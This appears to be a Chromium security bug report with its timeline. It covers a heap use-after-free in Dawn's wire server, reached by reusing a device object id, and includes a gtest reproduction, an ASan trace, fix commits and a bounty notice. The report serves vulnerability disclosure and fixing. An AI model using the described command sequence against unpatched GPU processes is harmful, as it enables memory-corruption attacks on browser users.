# Security Bug: UAF in Dawn wire from RequestDevice id reuse

| Field | Value |
|-------|-------|
| **Issue ID** | [508092644](https://issues.chromium.org/issues/508092644) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Dawn>Wire |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | 62...@qq.com |
| **Assignee** | lo...@google.com |
| **Created** | 2026-04-30 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

`Server::DoAdapterRequestDevice` allocates a reserved wire device slot and stores
`device->info.get()` (a raw `DeviceInfo*`) into
`desc.uncapturedErrorCallbackInfo.userdata2`. Later, the uncaptured-error lambda restores
that pointer and directly dereferences `info->server` / `info->self` without any
generation, ownership, or liveness revalidation.

The async completion path only tracks `device.id`, not generation. In
`Server::OnRequestDeviceCallback`, the completion uses
`FillReservation(data->deviceObjectId, device, &reservation)`, and `FillReservation` only
looks up by `id` and checks `state == Reserved`. If a compromised renderer issues:

1. `RequestDevice(id = X, generation = G0)`
2. `UnregisterObject(Device, X)` before the first completion arrives
3. `RequestDevice(id = X, generation = G1 > G0)`

then the old completion can still bind backend device A into the new reservation for `{X, G1}`. However, backend device A still carries the uncaptured-error callback userdata
captured from the first request, i.e. the old `DeviceInfo*`.

That old `DeviceInfo` is freed when the original reservation is destroyed by
`UnregisterObject`. If the uncaptured-error callback is then invoked on backend device A,
the server-side lambda dereferences a dangling `DeviceInfo*`, resulting in a
heap-use-after-free. The renderer-side command sequence itself is real Dawn wire behavior:
the renderer can issue the first `RequestDevice`, release the original reservation with
`UnregisterObject(Device, X)`, then reissue `RequestDevice` on the same object id with a
higher generation before the first completion arrives, creating the stale callback binding
needed for the UAF.

**VERSION**

Chromium / Dawn Version: main checkout

Operating System: Linux x86\_64

**REPRODUCTION CASE**

```
TEST_F(WireSpecificCommandTests,
RequestDeviceIdReuseThenUncapturedErrorUsesFreedDeviceInfo) {
    auto* clientImpl = GetWireClient()->GetImplForTesting();
    auto* wireAdapter = dawn::wire::client::FromAPI(adapter.Get());
    const Handle adapterHandle = wireAdapter->GetWireHandle(clientImpl);
    const ObjectHandle eventManagerHandle = wireAdapter->GetEventManagerHandle();

    const Handle currentDeviceHandle = GetWireClient()->GetWireHandle(device.Get());
    const ObjectId reusedObjectId = currentDeviceHandle.id + 1;
    static constexpr ObjectGeneration kGenerationA = 1;
    static constexpr ObjectGeneration kGenerationB = 2;

    WGPUDeviceDescriptor requestDesc = {};
    WGPURequestDeviceCallbackInfo callbackA = {};
    WGPURequestDeviceCallbackInfo callbackB = {};
    WGPUDevice apiDeviceA = api.GetNewDevice();
    WGPUDevice apiDeviceB = api.GetNewDevice();

    auto captureRequest = [&](WGPUDevice apiDevice, WGPURequestDeviceCallbackInfo* out,
                              const WGPUDeviceDescriptor* desc,
                              WGPURequestDeviceCallbackInfo callbackInfo) {
        *out = callbackInfo;
        auto* object = reinterpret_cast<ProcTableAsClass::Object*>(apiDevice);
        object->mUncapturedErrorCallback = desc->uncapturedErrorCallbackInfo.callback;
        object->mUncapturedErrorUserdata1 = desc->uncapturedErrorCallbackInfo.userdata1;
        object->mUncapturedErrorUserdata2 = desc->uncapturedErrorCallbackInfo.userdata2;
    };

    EXPECT_CALL(api, OnAdapterRequestDevice(apiAdapter, NotNull(), _))
        .WillOnce([&](WGPUAdapter, const WGPUDeviceDescriptor* desc,
                      WGPURequestDeviceCallbackInfo callbackInfo) {
            captureRequest(apiDeviceA, &callbackA, desc, callbackInfo);
        });

    AdapterRequestDeviceCmd requestA = {};
    requestA.adapterId = adapterHandle.id;
    requestA.eventManagerHandle = eventManagerHandle;
    requestA.future = {101};
    requestA.deviceObjectHandle = {reusedObjectId, kGenerationA};
    requestA.deviceLostFuture = {201};
    requestA.descriptor = &requestDesc;
    AddSpecificServerCmd(requestA);
    FlushClient();

    UnregisterObjectCmd dropA = {};
    dropA.objectType = ObjectType::Device;
    dropA.objectId = reusedObjectId;
    AddSpecificServerCmd(dropA);
    FlushClient();

    AdapterRequestDeviceCmd requestB = {};
    requestB.adapterId = adapterHandle.id;
    requestB.eventManagerHandle = eventManagerHandle;
    requestB.future = {102};
    requestB.deviceObjectHandle = {reusedObjectId, kGenerationB};
    requestB.deviceLostFuture = {202};
    requestB.descriptor = &requestDesc;

    EXPECT_CALL(api, OnAdapterRequestDevice(apiAdapter, NotNull(), _))
        .WillOnce([&](WGPUAdapter, const WGPUDeviceDescriptor* desc,
                      WGPURequestDeviceCallbackInfo callbackInfo) {
            captureRequest(apiDeviceB, &callbackB, desc, callbackInfo);
        });

    AddSpecificServerCmd(requestB);
    FlushClient();

    ASSERT_NE(callbackA.callback, nullptr);
    ASSERT_NE(callbackB.callback, nullptr);

    EXPECT_CALL(api, DeviceGetFeatures(apiDeviceA, NotNull()))
        .WillOnce(WithArg<1>([](WGPUSupportedFeatures* features) { *features = {}; }));
    EXPECT_CALL(api, DeviceGetLimits(apiDeviceA, NotNull()))
        .WillOnce(WithArg<1>([](WGPULimits* limits) {
            *limits = {};
            return WGPUStatus_Success;
        }));
    EXPECT_CALL(api, OnDeviceSetLoggingCallback(apiDeviceA, _)).Times(1);
    callbackA.callback(WGPURequestDeviceStatus_Success, apiDeviceA, kEmptyOutputStringView,
                       callbackA.userdata1, callbackA.userdata2);

    EXPECT_EQ(GetWireServer()->GetDevice(reusedObjectId, kGenerationB), apiDeviceA);
    EXPECT_EQ(GetWireServer()->GetDevice(reusedObjectId, kGenerationA), nullptr);

    EXPECT_CALL(api, DeviceGetFeatures(apiDeviceB, NotNull()))
        .WillOnce(WithArg<1>([](WGPUSupportedFeatures* features) { *features = {}; }));
    EXPECT_CALL(api, DeviceGetLimits(apiDeviceB, NotNull()))
        .WillOnce(WithArg<1>([](WGPULimits* limits) {
            *limits = {};
            return WGPUStatus_Success;
        }));
    EXPECT_CALL(api, DeviceRelease(apiDeviceB)).Times(1);
    callbackB.callback(WGPURequestDeviceStatus_Success, apiDeviceB, kEmptyOutputStringView,
                       callbackB.userdata1, callbackB.userdata2);

    api.CallDeviceUncapturedErrorCallback(apiDeviceA, WGPUErrorType_Validation,
                                          ToOutputStringView("repro"));
}

```

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: heap-use-after-free in Dawn wire server callback path

```
  =================================================================
  ==697999==ERROR: AddressSanitizer: heap-use-after-free on address 0x7bc223716f10 at pc
  0x558937f1e2cc bp 0x7ffc6f31e290 sp 0x7ffc6f31e288
  READ of size 8 at 0x7bc223716f10 thread T0
      #0 0x558937f1e2cb in
  dawn::wire::server::Server::DoAdapterRequestDevice(dawn::wire::server::Known<WGPUAdapterImp
  l*>, dawn::wire::ObjectHandle, WGPUFuture, dawn::wire::ObjectHandle, WGPUFuture,
  WGPUDeviceDescriptor const*)::$_0::__invoke(WGPUDeviceImpl* const*, WGPUErrorType,
  WGPUStringView, void*, void*) base/allocator/partition_allocator/src/partition_alloc/
  pointers/raw_ptr.h:1012:48
      #1 0x558936340d68 in
  ProcTableAsClass::CallDeviceUncapturedErrorCallback(WGPUDeviceImpl*, WGPUErrorType,
  WGPUStringView) gen/third_party/dawn/src/dawn/mock_webgpu.cpp:1545:5
      #2 0x55893766856e in dawn::wire::(anonymous
  namespace)::WireSpecificCommandTests_RequestDeviceIdReuseThenUncapturedErrorUsesFreedDevice
  Info_Test::TestBody() third_party/dawn/src/dawn/tests/unittests/wire/
  WireSpecificCommandTests.cpp:241:9
      #3 0x558937f6ffc9 in testing::Test::Run() third_party/googletest/src/googletest/src/
  gtest.cc
      #4 0x558937f726d3 in testing::TestInfo::Run() third_party/googletest/src/googletest/
  src/gtest.cc:2892:11
      #5 0x558937f745e6 in testing::TestSuite::Run() third_party/googletest/src/googletest/
  src/gtest.cc:3070:30
      #6 0x558937f9f816 in testing::internal::UnitTestImpl::RunAllTests() third_party/
  googletest/src/googletest/src/gtest.cc:6062:44
      #7 0x558937f9e4aa in testing::UnitTest::Run() third_party/googletest/src/googletest/
  src/gtest.cc
      #8 0x55893893dafe in base::TestSuite::Run() base/test/test_suite.cc:440:16
      #9 0x558937f2ffb0 in (anonymous namespace)::RunHelper(base::TestSuite*) gpu/
  dawn_unittests_main.cc:17:22
      #10 0x558937f303ea in base::internal::Invoker<base::internal::FunctorTraits<int (*&&)
  (base::TestSuite*), base::TestSuite*>, base::internal::BindState<false, true, false, int
  (*)(base::TestSuite*), base::internal::UnretainedWrapper<base::TestSuite,
  base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, int
  ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:673:12
      #11 0x5589389604cd in base::OnceCallback<int ()>::Run() && base/functional/
  callback.h:155:12
      #12 0x55893895d854 in base::(anonymous
  namespace)::LaunchUnitTestsInternal(base::OnceCallback<int ()>, unsigned long, int,
  unsigned long, bool, base::RepeatingCallback<void ()>, base::OnceCallback<void ()>) base/
  test/launcher/unit_test_launcher.cc:189:38
      #13 0x55893895e07f in base::LaunchUnitTestsSerially(int, char**, base::OnceCallback<int
  ()>) base/test/launcher/unit_test_launcher.cc:347:10
      #14 0x558937f2fdfd in main gpu/dawn_unittests_main.cc:31:12
      #15 0x7fa224645249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId:
  6196744a316dbd57c0fd8968df1680aac482cec4)

  0x7bc223716f10 is located 0 bytes inside of 16-byte region [0x7bc223716f10,0x7bc223716f20)
  freed by thread T0 here:
      #0 0x558936334ea2 in operator delete(void*, unsigned long) (/root/audit-agent/
  projects/926066208cc345b4ae4b858d9ce323de/chromium/src/out/asan/dawn_unittests+0x1251ea2)
  (BuildId: c855620a634a3685)
      #1 0x558937e91e3c in
  dawn::wire::server::Server::DoUnregisterObject(dawn::wire::ObjectType, unsigned int) gen/
  third_party/libc++/src/include/__memory/unique_ptr.h:74:5
      #2 0x558937ea9e5c in dawn::wire::server::Server::HandleCommands(char const volatile*,
  unsigned long) gen/third_party/dawn/src/dawn/wire/server/ServerHandlers_autogen.cpp:1635:18
      #3 0x5589388f7372 in dawn::utils::TerribleCommandBuffer::Flush() third_party/dawn/src/
  dawn/utils/TerribleCommandBuffer.cpp:74:30
      #4 0x558937672f20 in dawn::WireTest::FlushClient(bool) third_party/dawn/src/dawn/tests/
  unittests/wire/WireTest.cpp:232:24
      #5 0x558937665db9 in dawn::wire::(anonymous
  namespace)::WireSpecificCommandTests_RequestDeviceIdReuseThenUncapturedErrorUsesFreedDevice
  Info_Test::TestBody() third_party/dawn/src/dawn/tests/unittests/wire/
  WireSpecificCommandTests.cpp:194:5
      #6 0x558937f6ffc9 in testing::Test::Run() third_party/googletest/src/googletest/src/
  gtest.cc
      #7 0x558937f726d3 in testing::TestInfo::Run() third_party/googletest/src/googletest/
  src/gtest.cc:2892:11
      #8 0x558937f745e6 in testing::TestSuite::Run() third_party/googletest/src/googletest/
  src/gtest.cc:3070:30
      #9 0x558937f9f816 in testing::internal::UnitTestImpl::RunAllTests() third_party/
  googletest/src/googletest/src/gtest.cc:6062:44
      #10 0x558937f9e4aa in testing::UnitTest::Run() third_party/googletest/src/googletest/
  src/gtest.cc
      #11 0x55893893dafe in base::TestSuite::Run() base/test/test_suite.cc:440:16
      #12 0x558937f2ffb0 in (anonymous namespace)::RunHelper(base::TestSuite*) gpu/
  dawn_unittests_main.cc:17:22
      #13 0x558937f303ea in base::internal::Invoker<base::internal::FunctorTraits<int (*&&)
  (base::TestSuite*), base::TestSuite*>, base::internal::BindState<false, true, false, int
  (*)(base::TestSuite*), base::internal::UnretainedWrapper<base::TestSuite,
  base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, int
  ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:673:12
      #14 0x5589389604cd in base::OnceCallback<int ()>::Run() && base/functional/
  callback.h:155:12
      #15 0x55893895d854 in base::(anonymous
  namespace)::LaunchUnitTestsInternal(base::OnceCallback<int ()>, unsigned long, int,
  unsigned long, bool, base::RepeatingCallback<void ()>, base::OnceCallback<void ()>) base/
  test/launcher/unit_test_launcher.cc:189:38
      #16 0x55893895e07f in base::LaunchUnitTestsSerially(int, char**, base::OnceCallback<int
  ()>) base/test/launcher/unit_test_launcher.cc:347:10
      #17 0x558937f2fdfd in main gpu/dawn_unittests_main.cc:31:12
      #18 0x7fa224645249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId:
  6196744a316dbd57c0fd8968df1680aac482cec4)

  previously allocated by thread T0 here:
      #0 0x55893633429d in operator new(unsigned long) (/root/audit-agent/
  projects/926066208cc345b4ae4b858d9ce323de/chromium/src/out/asan/dawn_unittests+0x125129d)
  (BuildId: c855620a634a3685)
      #1 0x558937f1e3dd in
  dawn::wire::server::KnownObjectsBase<WGPUDeviceImpl*>::Allocate(dawn::wire::server::Reserve
  d<WGPUDeviceImpl*>*, dawn::wire::ObjectHandle, dawn::wire::server::AllocationState) gen/
  third_party/libc++/src/include/__memory/unique_ptr.h:756:26
      #2 0x558937f1d039 in dawn::wire::WireResult
  dawn::wire::server::ServerBase::Allocate<WGPUDeviceImpl*>(dawn::wire::server::Reserved<WGPU
  DeviceImpl*>*, dawn::wire::ObjectHandle, dawn::wire::server::AllocationState) third_party/
  dawn/src/dawn/wire/server/ObjectStorage.h:303:48
      #3 0x558937f1c9b9 in
  dawn::wire::server::Server::DoAdapterRequestDevice(dawn::wire::server::Known<WGPUAdapterImp
  l*>, dawn::wire::ObjectHandle, WGPUFuture, dawn::wire::ObjectHandle, WGPUFuture,
  WGPUDeviceDescriptor const*) third_party/dawn/src/dawn/wire/server/ServerAdapter.cpp:46:14
      #4 0x558937e9b75a in
  dawn::wire::server::Server::HandleAdapterRequestDevice(dawn::wire::DeserializeBuffer*) gen/
  third_party/dawn/src/dawn/wire/server/ServerHandlers_autogen.cpp:14:18
      #5 0x558937ea9cb5 in dawn::wire::server::Server::HandleCommands(char const volatile*,
  unsigned long) gen/third_party/dawn/src/dawn/wire/server/ServerHandlers_autogen.cpp:1652:30
      #6 0x5589388f7372 in dawn::utils::TerribleCommandBuffer::Flush() third_party/dawn/src/
  dawn/utils/TerribleCommandBuffer.cpp:74:30
      #7 0x558937672f20 in dawn::WireTest::FlushClient(bool) third_party/dawn/src/dawn/tests/
  unittests/wire/WireTest.cpp:232:24
      #8 0x558937665cf6 in dawn::wire::(anonymous
  namespace)::WireSpecificCommandTests_RequestDeviceIdReuseThenUncapturedErrorUsesFreedDevice
  Info_Test::TestBody() third_party/dawn/src/dawn/tests/unittests/wire/
  WireSpecificCommandTests.cpp:188:5
      #9 0x558937f6ffc9 in testing::Test::Run() third_party/googletest/src/googletest/src/
  gtest.cc
      #10 0x558937f726d3 in testing::TestInfo::Run() third_party/googletest/src/googletest/
  src/gtest.cc:2892:11
      #11 0x558937f745e6 in testing::TestSuite::Run() third_party/googletest/src/googletest/
  src/gtest.cc:3070:30
      #12 0x558937f9f816 in testing::internal::UnitTestImpl::RunAllTests() third_party/
  googletest/src/googletest/src/gtest.cc:6062:44
      #13 0x558937f9e4aa in testing::UnitTest::Run() third_party/googletest/src/googletest/
  src/gtest.cc
      #14 0x55893893dafe in base::TestSuite::Run() base/test/test_suite.cc:440:16
      #15 0x558937f2ffb0 in (anonymous namespace)::RunHelper(base::TestSuite*) gpu/
  dawn_unittests_main.cc:17:22
      #16 0x558937f303ea in base::internal::Invoker<base::internal::FunctorTraits<int (*&&)
  (base::TestSuite*), base::TestSuite*>, base::internal::BindState<false, true, false, int
  (*)(base::TestSuite*), base::internal::UnretainedWrapper<base::TestSuite,
  base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, int
  ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:673:12
      #17 0x5589389604cd in base::OnceCallback<int ()>::Run() && base/functional/
  callback.h:155:12
      #18 0x55893895d854 in base::(anonymous
  namespace)::LaunchUnitTestsInternal(base::OnceCallback<int ()>, unsigned long, int,
  unsigned long, bool, base::RepeatingCallback<void ()>, base::OnceCallback<void ()>) base/
  test/launcher/unit_test_launcher.cc:189:38
      #19 0x55893895e07f in base::LaunchUnitTestsSerially(int, char**, base::OnceCallback<int
  ()>) base/test/launcher/unit_test_launcher.cc:347:10
      #20 0x558937f2fdfd in main gpu/dawn_unittests_main.cc:31:12
      #21 0x7fa224645249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId:
  6196744a316dbd57c0fd8968df1680aac482cec4)

  SUMMARY: AddressSanitizer: heap-use-after-free base/allocator/partition_allocator/src/
  partition_alloc/pointers/raw_ptr.h:1012:48 in
  dawn::wire::server::Server::DoAdapterRequestDevice(dawn::wire::server::Known<WGPUAdapterImp
  l*>, dawn::wire::ObjectHandle, WGPUFuture, dawn::wire::ObjectHandle, WGPUFuture,
  WGPUDeviceDescriptor const*)::$_0::__invoke(WGPUDeviceImpl* const*, WGPUErrorType,
  WGPUStringView, void*, void*)
  Shadow bytes around the buggy address:
    0x7bc223716c80: fa fa 00 00 fa fa fd fd fa fa fd fd fa fa fd fd
    0x7bc223716d00: fa fa fd fd fa fa fd fd fa fa fd fa fa fa fd fd
    0x7bc223716d80: fa fa fd fa fa fa fd fa fa fa fd fd fa fa fd fa
  =>0x7bc223716f00: fa fa[fd]fd fa fa fd fa fa fa fd fa fa fa fd fd
    0x7bc223716f80: fa fa fd fa fa fa fd fd fa fa fd fd fa fa fd fa
    0x7bc223717000: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
    0x7bc223717080: fa fa fd fd fa fa fd fd fa fa fd fa fa fa fd fd
    0x7bc223717100: fa fa 00 00 fa fa fd fa fa fa fd fa fa fa fd fd
    0x7bc223717180: fa fa fd fa fa fa 00 00 fa fa 00 00 fa fa fd fd
  Shadow byte legend (one shadow byte represents 8 application bytes):
    Addressable:           00
    Partially addressable: 01 02 03 04 05 06 07
    Heap left redzone:       fa
    Freed heap region:       fd
    Stack left redzone:      f1
    Stack mid redzone:       f2
    Stack right redzone:     f3
    Stack after return:      f5
    Stack use after scope:   f8
    Global redzone:          f9
    Global init order:       f6
    Poisoned by user:        f7
    Container overflow:      fc
    Array cookie:            ac
    Intra object redzone:    bb
    ASan internal:           fe
    Left alloca redzone:     ca
    Right alloca redzone:    cb

  ==697999==ADDITIONAL INFO

  ==697999==Note: Please include this section with the ASan report.
  Task trace:


  ==697999==END OF ADDITIONAL INFO

  ==697999==ABORTING

```

## Timeline

### cw...@chromium.org (2026-04-30)

UAF from compromised renderer in the GPU process, P1/S1. Loko PTAL!

We could make `FillReservation` fallible and require a generation ID that must compare equal to what's expected. Similar issues could happen with other reservations (adapter, pipelines, surface textures?)

### lo...@google.com (2026-05-14)

Sorry for the delay, but I have been looking at this and while the fix isn't too hard (and I think I have it implemented already), I am trying to add testing for it that is a little less confusing as the PoC in the description. That part is turning out to be a bit difficult because of the way that we set up the mocking and stuff in the wire tests.

### dx...@google.com (2026-05-19)

Project: dawn  

Branch:  main  

Author:  Lokbondo Kung [lokokung@google.com](mailto:lokokung@google.com)  

Link:    <https://dawn-review.googlesource.com/309135>

[wire] Fixes potential UAF when dealing with injected Unregisters.

---


Expand for full commit details
```
     
    - In the bug below, it was found that by injecting UnregisterObject 
      commands that correspond to allocated but not backed objects, i.e. 
      objects that would be returned via asynchronous APIs, it was 
      possible to make the server access freed memory if we tried to 
      run the async API again while reusing the same object ids. This 
      change makes it so that the server tracks both the id and the 
      generation to uniquely identify objects when dealing with a 
      malicious or compromised client. When an async callback fires on 
      the server side that should fulfill a reservation that was 
      somehow already Unregistered, the server now fails the callback 
      and reclaims the backing object instead. 
    - In order to properly test this new change, the mock API was 
      updated to allow specifying specific futures when emulating 
      callbacks firing on the server side. A sibling API was added to 
      allow mock expectations to retrieve the server-side Futures to 
      allow fine-grained control of which callbacks to trigger via 
      emulation. This meant that the mock objects now need maps for 
      callbacks per object because we could have multiple identical 
      callback types in flight at once. To avoid polluting other 
      existing test code, the additional Future argument is 
      optional with the assertion that only one callback was in 
      flight. 
     
    Bug: 508092644 
    Change-Id: I6944afc4420c7f345c16796cc692dafa4f2f88cc 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/309135 
    Commit-Queue: Loko Kung <lokokung@google.com> 
    Reviewed-by: Corentin Wallez <cwallez@chromium.org>

```

---

Files:

- M `generator/templates/dawn/wire/server/ServerBase.h`
- M `generator/templates/mock_api.cpp`
- M `generator/templates/mock_api.h`
- M `include/dawn/wire/WireServer.h`
- M `src/dawn/tests/unittests/wire/WireSpecificCommandTests.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.h`
- M `src/dawn/utils/TerribleCommandBuffer.cpp`
- M `src/dawn/utils/TerribleCommandBuffer.h`
- M `src/dawn/wire/WireServer.cpp`
- M `src/dawn/wire/server/ObjectStorage.h`
- M `src/dawn/wire/server/Server.h`
- M `src/dawn/wire/server/ServerAdapter.cpp`
- M `src/dawn/wire/server/ServerDevice.cpp`
- M `src/dawn/wire/server/ServerInstance.cpp`
- M `src/dawn/wire/server/ServerSurface.cpp`

---

Hash: 1c5131547e777334e1fbe6de7c669e094ada7678  

Date: Tue May 19 19:22:44 2026


---

### dx...@google.com (2026-05-20)

Project: chromium/src  

Branch:  main  

Author:  [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com) [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7861097>

Roll Dawn from 43237eb54772 to eff1707f2b3a (5 revisions)

---


Expand for full commit details
```
     
    https://dawn.googlesource.com/dawn.git/+log/43237eb54772..eff1707f2b3a 
     
    2026-05-19 kjlubick@google.com Fix CMake defaults for SPIRV validation 
    2026-05-19 lokokung@google.com [wire] Fixes potential UAF when dealing with injected Unregisters. 
    2026-05-19 lokokung@google.com [procs] Add a DAWN_CHECK to validate the proc version table. 
    2026-05-19 sarath.singapati@huawei.com Vulkan: Accept fd=-1 as valid for SYNC_FD semaphore import/export 
    2026-05-19 shaoboyan@microsoft.com [dawn][tint] Ship immediate_address_space with killswitch 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/dawn-chromium-autoroll 
    Please CC cwallez@google.com,rharrison@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in Dawn: https://bugs.chromium.org/p/dawn/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Cq-Include-Trybots: luci.chromium.try:dawn-android-arm-deps-rel;luci.chromium.try:dawn-android-arm64-deps-rel;luci.chromium.try:dawn-linux-x64-deps-rel;luci.chromium.try:dawn-mac-x64-deps-rel;luci.chromium.try:dawn-mac-arm64-deps-rel;luci.chromium.try:dawn-win10-x64-deps-rel;luci.chromium.try:dawn-win10-x86-deps-rel;luci.chromium.try:dawn-win11-arm64-deps-rel;luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-mac-arm64;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-android-arm64 
    Bug: chromium:366291600,chromium:437259103,chromium:502536510,chromium:508092644,chromium:511315131 
    Tbr: rharrison@google.com 
    Change-Id: I13672493e3c7ba20c1ea62301361d4f7c825eb7d 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7861097 
    Commit-Queue: chromium-autoroll@skia-public.iam.gserviceaccount.com <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll@skia-public.iam.gserviceaccount.com <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1633260}

```

---

Files:

- M `DEPS`
- M `third_party/dawn`

---

Hash: [16fe899ff3ff184c3134798fe336531fffd4e7d1](https://chromiumdash.appspot.com/commit/16fe899ff3ff184c3134798fe336531fffd4e7d1)  

Date: Wed May 20 01:31:36 2026


---

### 62...@qq.com (2026-05-20)

credit: whiter@xuanyusec

Thanks!

### ch...@google.com (2026-05-21)

Requesting merge to M148 because latest trunk commit is in 150.

Security Merge Request:

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Requesting merge to M149 because latest trunk commit is in 150.

### ch...@google.com (2026-05-21)

**M148** merge request created. **Please update [crbug/515275130](https://crbug.com/515275130) to have this merge reviewed.**

### ch...@google.com (2026-05-21)

**M149** merge request created. **Please update [crbug/515275963](https://crbug.com/515275963) to have this merge reviewed.**

### dx...@google.com (2026-05-27)

Project: dawn  

Branch:  chromium/7778  

Author:  Lokbondo Kung [lokokung@google.com](mailto:lokokung@google.com)  

Link:    <https://dawn-review.googlesource.com/311317>

[M148] [wire] Fixes potential UAF when dealing with injected Unregisters.

---


Expand for full commit details
```
     
    - In the bug below, it was found that by injecting UnregisterObject 
      commands that correspond to allocated but not backed objects, i.e. 
      objects that would be returned via asynchronous APIs, it was 
      possible to make the server access freed memory if we tried to 
      run the async API again while reusing the same object ids. This 
      change makes it so that the server tracks both the id and the 
      generation to uniquely identify objects when dealing with a 
      malicious or compromised client. When an async callback fires on 
      the server side that should fulfill a reservation that was 
      somehow already Unregistered, the server now fails the callback 
      and reclaims the backing object instead. 
    - In order to properly test this new change, the mock API was 
      updated to allow specifying specific futures when emulating 
      callbacks firing on the server side. A sibling API was added to 
      allow mock expectations to retrieve the server-side Futures to 
      allow fine-grained control of which callbacks to trigger via 
      emulation. This meant that the mock objects now need maps for 
      callbacks per object because we could have multiple identical 
      callback types in flight at once. To avoid polluting other 
      existing test code, the additional Future argument is 
      optional with the assertion that only one callback was in 
      flight. 
     
    Bug: 508092644 
    Fixed: 515275130 
    Change-Id: I6944afc4420c7f345c16796cc692dafa4f2f88cc 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/309135 
    Commit-Queue: Loko Kung <lokokung@google.com> 
    Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/311317 
    Auto-Submit: Kai Ninomiya <kainino@chromium.org> 
    Commit-Queue: Kai Ninomiya <kainino@chromium.org> 
    Reviewed-by: Kai Ninomiya <kainino@chromium.org>

```

---

Files:

- M `generator/templates/dawn/wire/server/ServerBase.h`
- M `generator/templates/mock_api.cpp`
- M `generator/templates/mock_api.h`
- M `include/dawn/wire/WireServer.h`
- M `src/dawn/tests/unittests/wire/WireSpecificCommandTests.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.h`
- M `src/dawn/utils/TerribleCommandBuffer.cpp`
- M `src/dawn/utils/TerribleCommandBuffer.h`
- M `src/dawn/wire/WireServer.cpp`
- M `src/dawn/wire/server/ObjectStorage.h`
- M `src/dawn/wire/server/Server.h`
- M `src/dawn/wire/server/ServerAdapter.cpp`
- M `src/dawn/wire/server/ServerDevice.cpp`
- M `src/dawn/wire/server/ServerInstance.cpp`
- M `src/dawn/wire/server/ServerSurface.cpp`

---

Hash: 228a0f020a62e7d2684856532c30fd993c0f89e5  

Date: Wed May 27 17:37:51 2026


---

### pe...@google.com (2026-05-27)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### sp...@google.com (2026-05-27)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
ASAN Read. Browser / Network / GPU (From web contents)


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### dx...@google.com (2026-05-28)

Project: dawn  

Branch:  chromium/7827  

Author:  Lokbondo Kung [lokokung@google.com](mailto:lokokung@google.com)  

Link:    <https://dawn-review.googlesource.com/311316>

[M149] [wire] Fixes potential UAF when dealing with injected Unregisters.

---


Expand for full commit details
```
     
    - In the bug below, it was found that by injecting UnregisterObject 
      commands that correspond to allocated but not backed objects, i.e. 
      objects that would be returned via asynchronous APIs, it was 
      possible to make the server access freed memory if we tried to 
      run the async API again while reusing the same object ids. This 
      change makes it so that the server tracks both the id and the 
      generation to uniquely identify objects when dealing with a 
      malicious or compromised client. When an async callback fires on 
